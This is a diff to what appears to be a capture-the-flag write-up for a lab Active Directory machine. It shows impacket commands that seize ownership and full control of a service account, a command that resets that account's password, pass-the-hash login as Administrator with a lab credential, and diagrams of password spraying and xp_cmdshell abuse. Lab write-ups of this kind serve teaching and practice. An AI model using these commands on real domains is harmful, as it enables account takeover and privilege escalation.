@@ -357,19 +357,16 @@ This reveals that `ryan` has the `WriteOwner` permission over the `ca_svc` accou
 Before attempting any of these attacks, i will click on the `ca_svc` account and investigate its `Outbound Object Controls` to find out if attacking it makes sense. And indeed, `ca_svc` is part of the `CERT PUBLISHERS` group, which has the `GenericAll` permissions over the `DUNDERMIFFLINAUTHENTICATION` certificate template! Because of this, i decided to `Force Change` the password of the `ca_svc` service. The following three steps are required for this:
 
 1. Change the ownership of `ca_svc` so that it belongs to `ryan`.
-
 ```bash
 impacket-owneredit -action write -new-owner ryan -target ca_svc sequel.htb/ryan:'WqSZAF6CysDQbGb3'
 ```
 
 2. As `ryan` owns `ca_svc`, he is allowed to edit the `DACL`, which can give him `GenericAll` permissions, allowing him to do anything with `ca_svc` (ability to perform the attacks mentioned above).
-
 ```bash
 impacket-dacledit -action write -rights FullControl -principal ryan -target ca_svc sequel.htb/ryan:'WqSZAF6CysDQbGb3'
 ```
 
 3. Change the password of `ca_svc` to `password123`.
-
 ```bash
 net rpc password ca_svc password123 -U sequel.htb/ryan --password='WqSZAF6CysDQbGb3' -S sequel.htb
 ```
@@ -394,3 +391,27 @@ It would be possible to try and get the clear-text password of the user by crack
 evil-winrm -i sequel.htb -u "sequel.htb\Administrator" -H <right-part-of-hash>
 ```
 This gives me a `powershell` as the `Administrator`!
+
+### Summary
+
+Below is a visualized summary of the exploitation steps used in this machine to gain RCE.
+
+``` mermaid
+graph LR
+  A[SMB<br>Service] -->|read| B[Multiple<br>credentials];
+  B -->|Password<br>spray| C[MSSQL<br>Service];
+  C -->|xp_cmdshell| D[Code<br>execution];
+
+  E[Code<br>execution] -->|read| F[Config<br>file];
+  F --> G[WinRM<br>Access];
+```
+
+The privilege escalation to the user `Administrator` worked as follows:
+
+``` mermaid
+graph LR
+  A[Ryan] -->|WriteOwner| B[CA_SVC];
+  B -->|GenericAll| C[Certificate<br>template];
+  B -->|impersonate<br>Administrator| D[Administrator's<br>NT-Hash];
+  D --> E[WinRM<br>Access];
+```
